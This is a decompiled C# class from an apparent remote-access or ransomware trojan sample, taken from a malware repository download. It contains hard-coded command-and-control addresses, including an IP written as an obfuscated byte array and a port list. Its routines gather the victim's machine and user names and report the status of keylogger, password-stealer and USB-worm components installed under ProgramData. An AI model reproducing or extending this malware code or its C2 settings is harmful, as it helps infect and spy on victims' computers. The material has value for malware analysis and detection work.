// Decompiled with JetBrains decompiler
// Type: thandhwiar.GCANONF
// Assembly: thandhwiar, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89805F93-CF8A-4ECE-A0DD-C3C2D313114A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-a0f6963845d7aeae328048da66059059fdbcb6cc30712fd10a34018caf0bd28a.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace thandhwiar
{
  public class GCANONF
  {
    public string mainsAepp = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
    public string pc_isd = "hdamra|".Split('|')[0];
    public string dy_isd = "0|".Split('|')[0];
    public byte[] vpsipzs = new byte[24]
    {
      (byte) 49,
      (byte) 52,
      (byte) 52,
      (byte) 46,
      (byte) 57,
      (byte) 49,
      (byte) 46,
      (byte) 55,
      (byte) 57,
      (byte) 46,
      (byte) 52,
      (byte) 48,
      (byte) 63,
      (byte) 111,
      (byte) 116,
      (byte) 98,
      (byte) 109,
      (byte) 97,
      (byte) 105,
      (byte) 108,
      (byte) 46,
      (byte) 99,
      (byte) 111,
      (byte) 109
    };
    public string kiysAdpp = "hlhrrasca|".Split('|')[0];
    public string filesPath = Application.ExecutablePath;
    public string flshsPath = "\\Khlrcnar\\|".Split('|')[0];
    public string usbswdrm = "iarswn|".Split('|')[0];
    public string psssAdpp = "thsalrarc|".Split('|')[0];
    public string defauxltP = "206.215.155.105|".Split('|')[0];
    public string remvxUser = "fthuivnua|".Split('|')[0];
    public string keexPath = "\\Mthehsca\\|".Split('|')[0];
    public string usbxApp = "datrliarw|".Split('|')[0];
    public string podrt = "12427, 6226, 18835, 16224, 20716";
    public string apdver;
    public string cdname = "";
    public string undame = "";
    public string lancadrd = "";
    public string duip = "";
    public short scrdSize = 210;
    public string pasxPath = "\\Phvmaci\\|".Split('|')[0];

    public void screenSsize(string scedSize)
    {
      try
      {
        this.scrdSize = Convert.ToInt16(scedSize.Split('>')[0].Trim());
      }
      catch
      {
      }
    }

    public string get_mpath() => Path.GetDirectoryName(this.filesPath) + "\\";

    public void Inxfo()
    {
      this.apdver = "4.0.0.1!".Split('!')[0];
      this.cdname = Environment.MachineName;
      this.undame = Environment.UserName;
    }

    public byte[] getBytedArray(string value)
    {
      char[] charArray = value.ToCharArray();
      byte[] bytedArray = new byte[charArray.Length];
      for (int index = 0; index < charArray.Length; ++index)
      {
        byte num = Convert.ToByte(charArray[index]);
        bytedArray[index] = num;
      }
      return bytedArray;
    }

    public byte[] getBytexArray(string value)
    {
      char[] charArray = value.ToCharArray();
      byte[] bytexArray = new byte[charArray.Length];
      for (int index = 0; index < charArray.Length; ++index)
      {
        byte num = Convert.ToByte(charArray[index]);
        bytexArray[index] = num;
      }
      return bytexArray;
    }

    public byte[] apps_staxtus()
    {
      try
      {
        string str1 = "0.0.0.0|".Split('|')[0];
        string str2 = "true!".Split('!')[0];
        string str3 = "maina#Runing|ver#!".Split('!')[0] + this.apdver + "|name#!".Split('!')[0] + this.mainsAepp + "|path#!".Split('!')[0] + this.get_mpath() + "|fileslog=!".Split('!')[0] + "N/A|apkey#!".Split('!')[0] + this.pc_isd + ">|".Split('|')[0];
        string productVersion1;
        string str4;
        if (File.Exists(this.kiPsath() + this.kiysAdpp + ".exe!".Split('!')[0]))
        {
          productVersion1 = FileVersionInfo.GetVersionInfo(this.kiPsath() + this.kiysAdpp + ".exe!".Split('!')[0]).ProductVersion;
          if (Process.GetProcessesByName(this.kiysAdpp).Length == 0)
            str4 = "Not Runing!".Split('!')[0];
          else
            str4 = "Runing!".Split('!')[0];
        }
        else
        {
          productVersion1 = "0.0.0.0!".Split('!')[0];
          str4 = "Not Present!".Split('!')[0];
        }
        string str5 = str3 + "keeap#!".Split('!')[0] + str4 + "|ver#!".Split('!')[0] + productVersion1 + "|name#!".Split('!')[0] + this.kiysAdpp + "|path#!".Split('!')[0] + this.kiPsath() + "|logfile#!".Split('!')[0] + this.kiysAdpp + ">|".Split('|')[0];
        string productVersion2;
        string str6;
        if (File.Exists(this.get_ppxath() + this.psssAdpp + ".exe!".Split('!')[0]))
        {
          productVersion2 = FileVersionInfo.GetVersionInfo(this.get_ppxath() + this.psssAdpp + ".exe!".Split('!')[0]).ProductVersion;
          str6 = "Present!".Split('!')[0];
        }
        else
        {
          productVersion2 = "0.0.0.0!".Split('!')[0];
          str6 = "Not Present!".Split('!')[0];
        }
        string str7 = str5 + "pasap#!".Split('!')[0] + str6 + "|ver#!".Split('!')[0] + productVersion2 + "|name#!".Split('!')[0] + this.psssAdpp + "|path#!".Split('!')[0] + this.get_ppxath() + "|logfile#!".Split('!')[0] + this.psssAdpp + ">|".Split('|')[0];
        string productVersion3;
        string str8;
        if (File.Exists(this.usbxPath() + this.usbxApp + ".exe!".Split('!')[0]))
        {
          productVersion3 = FileVersionInfo.GetVersionInfo(this.usbxPath() + this.usbxApp + ".exe!".Split('!')[0]).ProductVersion;
          if (Process.GetProcessesByName(this.usbxApp).Length == 0)
            str8 = "Not Runing!".Split('!')[0];
          else
            str8 = "Runing!".Split('!')[0];
        }
        else
        {
          productVersion3 = "0.0.0.0!".Split('!')[0];
          str8 = "Not Present!".Split('!')[0];
        }
        return this.getBytexArray(str7 + "usbap#!".Split('!')[0] + str8 + "|ver#!".Split('!')[0] + productVersion3 + "|name#!".Split('!')[0] + this.usbxApp + "|path#!".Split('!')[0] + this.usbxPath() + "|logfile#!".Split('!')[0] + this.usbxApp + "|usbwrm#!".Split('!')[0] + this.usbswdrm + ">|".Split('|')[0]);
      }
      catch
      {
        return (byte[]) null;
      }
    }

    public string kiPsath() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + this.keexPath;

    public string Ossname()
    {
      try
      {
        OperatingSystem osVersion = Environment.OSVersion;
        return osVersion.Version.Major.ToString() + ">" + osVersion.Version.Minor.ToString();
      }
      catch
      {
        return "6>1!".Split('!')[0];
      }
    }

    public string get_ppxath() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + this.pasxPath;

    public string usbxPath() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + this.flshsPath;
  }
}
